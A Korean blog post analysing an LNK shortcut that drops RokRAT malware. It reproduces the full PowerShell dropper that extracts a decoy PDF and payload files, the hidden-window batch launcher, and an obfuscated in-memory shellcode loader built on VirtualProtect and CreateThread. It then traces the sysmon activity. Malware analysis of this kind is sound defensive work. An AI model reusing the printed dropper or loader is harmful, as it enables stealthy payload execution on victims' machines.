---
title: RokRAT 악성코드를 유포하는 LNK 파일 분석
author: heogi
date: 2024-05-06
categories:
  - Malware
tags:
  - Malware
  - RokRAT
  - LNK
comments: true
---
## 개요
RokRAT 악성코드를 유포하는 LNK 파일에 대한 분석 보고서이다.

## 분석
파일 속성을 살펴보면 아래와 같이 CMD 스크립트가 삽입되어있다.

![](../assets/img/2024-05-06-RokRAT%20악성코드를%20유포하는%20LNK%20파일%20분석-20240506002542442.png)

실행하면 아래와 같은 커맨드가 CMD에서 실행되게 된다.

```powershell
"C:\Windows\SysWOW64\cmd.exe" /k for /f 
"tokens=*" %%a in ('dir C:\Windows\SysWow64\WindowsPowerShell\v1.0\*rshell.exe /s /b /od') do call %%a 
"$dirPath = Get-Location; 
if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {
	$dirPath = '%temp%\AppData\Local\Temp'
}; 
$lnkPath = Get-ChildItem -Path $dirPath -Recurse *.lnk | where-object {$_.length -eq 0x0382A8AD} | Select-Object -ExpandProperty FullName;
$lnkFile=New-Object System.IO.FileStream($lnkPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read);
$lnkFile.Seek(0x00001090, [System.IO.SeekOrigin]::Begin);
$pdfFile=New-Object byte[] 0x004B4DD3;
$lnkFile.Read($pdfFile, 0, 0x004B4DD3);
$pdfPath = $lnkPath.replace('.lnk','.pdf');
sc $pdfPath $pdfFile -Encoding Byte;& $pdfPath;
$lnkFile.Seek(0x004B5E63,[System.IO.SeekOrigin]::Begin);
$exeFile=New-Object byte[] 0x000D9402;
$lnkFile.Read($exeFile, 0, 0x000D9402);
$exePath=$env:public+'\'+'panic.dat';
sc $exePath $exeFile -Encoding Byte;
$lnkFile.Seek(0x0058F265,[System.IO.SeekOrigin]::Begin);
$stringByte = New-Object byte[] 0x000005A9;
$lnkFile.Read($stringByte, 0, 0x000005A9);
$batStrPath = $env:temp+'\'+'para.dat';
$string = [System.Text.Encoding]::UTF8.GetString($stringByte);
$string | Out-File -FilePath $batStrPath -Encoding ascii;$lnkFile.Seek(0x0058F80E,[System.IO.SeekOrigin]::Begin);
$batByte = New-Object byte[] 0x00000135;
$lnkFile.Read($batByte, 0, 0x00000135);
$executePath = $env:temp+'\'+'price.bat';
Write-Host $executePath;
Write-Host $batStrPath;
$bastString = [System.Text.Encoding]::UTF8.GetString($batByte);$bastString | Out-File -FilePath $executePath -Encoding ascii;& $executePath;
$lnkFile.Close();
remove-item -path $lnkPath -force;"&& exit
```

해당 스크립트에서 실행한 악성 파일의 내용을 참조하여
normal pdf 파일 및 공격에 사용되는 `panic.dat`, `para.dat`, `price.bat` 파일들을 생성한다.

스크립트 실행 이후 실행 흐름을 보면 아래와 같다
* `price.bat` > `para.dat` > `panic.dat`

먼저 price.bat 파일의 내용을 살펴보면 아래와 같다.

* price.bat
```powershell
start /min C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden "$stringPath=$env:temp+'\'+'para.dat';
$stringByte = Get-Content -path $stringPath -encoding byte;
$string = [System.Text.Encoding]::UTF8.GetString($stringByte);
$scriptBlock = [scriptblock]::Create($string);&$scriptBlock;"
```
* price.bat sysmon event
  ![](../assets/img/Pasted%20image%2020240513235200.png)

powershell을 통해 `$stringPath` 변수를 `para.dat` 파일 경로로 설정하고 내용을 읽어 스크립트를 실행한다.
* para.dat
```powershell
$exePath=$env:public+'\'+'panic.dat';
$exeFile = Get-Content -path $exePath -encoding byte;
[Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([Net.SecurityProtocolType], 3072);
$k1123 = [System.Text.Encoding]::UTF8.GetString(34) + 'kernel32.dll' + [System.Text.Encoding]::UTF8.GetString(34);
$a90234s = '[DllImport(' + $k1123 + ')]public static extern IntPtr GlobalAlloc(uint b,uint c);';
$b = Add-Type -MemberDefinition $a90234s  -Name 'AAA' -PassThru;
$d3s9sdf = '[DllImport(' + $k1123 + ')]public static extern bool VirtualProtect(IntPtr a,uint b,uint c,out IntPtr d);';
$a90234sb = Add-Type -MemberDefinition $d3s9sdf -Name 'AAB' -PassThru;
$b3s9s03sfse = '[DllImport(' + $k1123 + ')]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);';
$cake3sd23 = Add-Type -MemberDefinition $b3s9s03sfse  -Name 'BBB' -PassThru;
$dtts9s03sd23 = '[DllImport(' + $k1123 + ')]public static extern IntPtr WaitForSingleObject(IntPtr a,uint b);';
$fried3sd23 = Add-Type -MemberDefinition $dtts9s03sd23 -Name 'DDD' -PassThru;
$byteCount = $exeFile.Length;
$buffer = $b::GlobalAlloc(0x0040, $byteCount + 0x100);
$old = 0;
$a90234sb::VirtualProtect($buffer, $byteCount + 0x100, 0x40, [ref]$old);
for($i = 0;$i -lt $byteCount;$i++) { [System.Runtime.InteropServices.Marshal]::WriteByte($buffer, $i, $exeFile[$i]); };
$handle = $cake3sd23::CreateThread(0, 0, $buffer, 0, 0, 0);
$fried3sd23::WaitForSingleObject($handle, 500 * 1000);
```
* para.dat sysmon event
  ![](../assets/img/Pasted%20image%2020240518193254.png)

스크립트에서 사용되는 Windows API를 살펴보면 `GlobalAlloc()`,`CreateThread()`,`VirtualProtect()`,`WaitForSingleObject()` 가 있다.

각각 살펴보면
* GlobalAlloc()
	* 힙에서 지정된 바이트 수를 할당.
* CreateThread()
	* 호출 프로세스의 가상 주소 공간 내에서 실행할 스레드를 만든다.
* VirtualProtect()
	* 호출 프로세스의 가상 주소 공간에서 커밋된 페이지의 영역에 대한 보호를 변경.
* WaitForSingleObject()
	* 특정 커널 오브젝트의 신호상태를 기다리는데 사용. 주로 스레드 동기화, 프로세스 동기화 등에 사용.

	이후 `panic.dat` 파일은 BYTE DATA로 되어있다.
sysmon 이벤트를 통해 행위를 살펴보면 `csc.exe` 를 통해 `%temp%` 폴더의 `oj0csqan.cmdline` 파일을 실행한다.

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\heogi-windows-vm\AppData\Local\Temp\oj0csqan.cmdline
```

`oj0csqan.cmdline`에서는 추가로 `cvtres.exe` 를 통해 `CSCF5747BCEF23F4D6FB71BD4A9987A973.TMP` 파일이 추가로 실행되는 것으로 보인다.

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\HEOGI-~1\AppData\Local\Temp\RES34A3.tmp" "c:\Users\heogi-windows-vm\AppData\Local\Temp\CSCF5747BCEF23F4D6FB71BD4A9987A973.TMP"
```

`csc.exe` 와 `cvtres.exe` 에 대해 간단하게 살펴보면

* `csc.exe`
  .NET에서 C# 코드를 컴파일하는데 사용되는 프로그램
* `cvtres.exe`
  Resource 파일을 COFF(Common Object File Format) 파일로 변환시켜주는 프로그램

`csc.exe` > `csvtres.exe` 의 과정이 총 3번이 진행되며, 실행 후 각각 `.cmdline`과 `.TMP` 파일은 삭제되는것으로 보인다.

해당 파일들을 확보하기 위하여 `%temp%` 폴더에 파일 삭제 권한을 없애고 다시 실행하여 파일을 확보하였다.

* `oj0csqan.cmdline`
```powershell

```
* `SCF5747BCEF23F4D6FB71BD4A9987A973.TMP`

## Reference
* https://asec.ahnlab.com/ko/64423/
* https://asec.ahnlab.com/ko/51628/